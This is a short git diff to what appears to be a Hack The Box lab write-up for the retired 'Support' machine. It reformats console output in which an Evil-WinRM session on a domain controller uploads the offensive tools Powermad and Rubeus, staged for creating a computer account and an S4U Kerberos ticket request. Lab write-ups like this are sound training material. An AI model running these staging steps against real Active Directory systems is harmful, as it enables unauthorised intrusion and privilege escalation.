@@ -1200,8 +1200,20 @@ upload Rubeus.exe
 **Result:**
 
 ```
-Info: Uploading .../Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1Data: 179940 bytes of 179940 bytes copiedInfo: Upload successful!
-Info: Uploading .../Rubeus.exe to C:\Users\support\Documents\Rubeus.exeData: 595968 bytes of 595968 bytes copiedInfo: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1
+                                        
+Info: Uploading /home/kali/nedmoeca/HTB/Machines/Retired/Support/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1
+                                        
+Data: 179940 bytes of 179940 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> upload Rubeus.exe
+                                        
+Info: Uploading /home/kali/nedmoeca/HTB/Machines/Retired/Support/Rubeus.exe to C:\Users\support\Documents\Rubeus.exe
+                                        
+Data: 595968 bytes of 595968 bytes copied
+                                        
+Info: Upload successful!
 ```
 
 _What this gives you:_ PowerMad and Rubeus are staged in `C:\Users\support\Documents` on the DC, ready to create the computer account and perform the S4U ticket request.
